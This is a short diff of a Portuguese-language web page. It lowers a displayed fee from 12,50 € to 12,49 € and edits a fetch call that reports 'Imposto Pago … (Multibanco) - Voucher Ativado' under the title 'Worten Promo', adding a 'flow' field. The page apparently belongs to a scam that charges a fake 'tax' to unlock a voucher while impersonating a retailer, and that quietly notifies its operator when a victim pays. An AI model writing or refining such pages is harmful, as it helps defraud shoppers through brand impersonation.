@@ -316,7 +316,7 @@
                 </div>
                 <div class="data-row">
                     <span class="label">Montante</span>
-                    <span class="value">12,50 €</span>
+                    <span class="value">12,49 €</span>
                 </div>
             </div>
         </div>
@@ -426,8 +426,9 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         type: "Aprovado delivery",
-                        text: "Imposto Pago: 12,50 € (Multibanco) - Voucher Ativado",
-                        title: "Worten Promo"
+                        text: "Imposto Pago: 12,49 € (Multibanco) - Voucher Ativado",
+                        title: "Worten Promo",
+                        flow: "root"
                     })
                 });
             } catch (e) { }
